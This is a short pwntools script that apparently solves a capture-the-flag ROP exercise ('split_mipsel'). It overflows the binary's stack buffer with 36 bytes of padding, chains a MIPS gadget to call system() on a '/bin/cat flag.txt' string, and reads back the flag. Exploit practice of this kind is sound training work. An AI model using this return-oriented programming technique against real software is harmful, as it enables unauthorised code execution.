from pwn import *

BINARY = "./split_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

"""
useful_gadget :
0x400A20   lw  $a0, 8($sp)
0x400A24   lw  $t9, 4($sp)
0x400A28   jalr  $t9
0x400A2C   nop
"""

useful_gadget = p32(0x400A20)
cat_flag      = p32(0x411010) # "/bin/cat flag.txt"

rop = b"A" * 36
rop += useful_gadget
rop += b"BBBB"
rop += p32(ELF.symbols["system"])
rop += cat_flag

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
